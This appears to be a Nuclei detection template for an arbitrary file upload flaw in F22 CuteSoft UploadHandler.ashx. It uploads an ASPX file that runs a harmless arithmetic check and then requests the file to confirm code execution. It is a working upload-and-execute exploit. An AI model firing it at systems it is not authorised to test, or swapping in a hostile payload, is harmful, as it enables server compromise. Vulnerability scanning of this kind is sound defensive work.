id: f22-cutesoft-uploadhandler-rce
info:
  name: F22 CuteSoft UploadHandler Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload,rce
  description: |
    This template detects the arbitrary file upload vulnerability in F22 CuteSoft UploadHandler.ashx, allowing potential remote code execution.

variables:
  randstr: "{{to_lower(rand_text_alphanumeric(27))}}"
  t1: "{{rand_int(100, 1000)}}"
  t2: "{{rand_int(100, 1000)}}"
  t3: "{{to_number(t1) * to_number(t2)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/CuteSoft_Client/UploadHandler.ashx"
    headers:
      Content-Type: "multipart/form-data; boundary=----------{{randstr}}"
    body: |-
      ------------{{randstr}}
      Content-Disposition: form-data; name="folder"

      /upload/udplog
      ------------{{randstr}}
      Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
      Content-Type: application/octet-stream

      This website has a vulnerability!!! <% response.write( {{t1}} * {{t2}}) %>
      ------------{{randstr}}
      Content-Disposition: form-data; name="Upload"

      Submit Query
      ------------{{randstr}}--
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: filename
        group: 1
        regex:
          - "1,(.*?).aspx"
        internal: true

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/upload/udplog/{{filename}}.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t3}}"
          - "This website has a vulnerability!!!"
